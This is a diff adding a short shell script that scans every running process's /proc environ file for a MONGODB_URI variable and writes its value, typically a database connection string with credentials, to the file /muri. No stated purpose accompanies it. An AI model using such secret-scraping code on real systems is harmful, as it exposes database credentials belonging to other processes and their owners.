@@ -1,0 +1,8 @@
+#!/bin/sh
+for p in /proc/[0-9]*; do
+  if grep -aq MONGODB_URI "$p/environ" 2>/dev/null; then
+    M=$(tr '\0' '\n' <"$p/environ" | sed -n 's/^MONGODB_URI=//p')
+    [ -n "$M" ] && { printf %s "$M" >/muri; sleep 20; exit; }
+  fi
+done
+sleep 5
